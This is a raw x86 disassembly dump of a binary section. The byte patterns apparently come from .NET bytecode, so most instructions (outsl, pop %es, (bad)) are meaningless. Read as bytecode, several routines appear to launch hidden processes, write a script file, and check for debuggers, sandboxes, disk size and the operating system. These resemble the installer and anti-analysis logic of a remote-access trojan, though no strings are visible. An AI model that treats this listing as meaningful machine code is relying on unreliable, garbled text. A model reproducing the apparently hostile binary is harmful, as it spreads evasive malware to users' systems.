  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 32       	add    $0x32720511,%eax
  4031ba:	22 00                	and    (%eax),%al
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 3a 22       	and    $0x223a7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 a4    	or     -0x5b8de7db(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 b6    	or     -0x498de5db(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 ca             	or     -0x36(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 28             	or     0x28(%edx),%dh
  403246:	23 00                	and    (%eax),%eax
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 28             	or     0x28(%edx),%dh
  403251:	23 00                	and    (%eax),%eax
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 2c                	jb     0x4032ef
  4032c3:	23 00                	and    (%eax),%eax
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 36             	or     %esi,0x36(%edx)
  4032da:	23 00                	and    (%eax),%eax
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 4a                	jb     0x403330
  4032e6:	23 00                	and    (%eax),%eax
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 6a                	jb     0x40335c
  4032f2:	23 00                	and    (%eax),%eax
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 28             	or     0x28(%edx),%dh
  4032fd:	23 00                	and    (%eax),%eax
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 80                	jb     0x40328e
  40330e:	23 00                	and    (%eax),%eax
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 88                	jb     0x4032ac
  403324:	23 00                	and    (%eax),%eax
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 94                	jb     0x4032c4
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 a4                	jb     0x403411
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 aa             	adc    %esi,-0x56(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 f0 23    	or     0x23f07209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	0a 24 00             	or     (%eax,%eax,1),%ah
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 36             	or     %esi,0x36(%edx)
  4034fc:	24 00                	and    $0x0,%al
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 42             	or     0x42(%edx),%dh
  403510:	24 00                	and    $0x0,%al
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	52                   	push   %edx
  403521:	24 00                	and    $0x0,%al
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 36                	jb     0x403567
  403531:	24 00                	and    $0x0,%al
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 60             	or     0x60(%edx),%dh
  403540:	24 00                	and    $0x0,%al
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 76             	adc    %esi,0x76(%edx)
  40362e:	24 00                	and    $0x0,%al
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
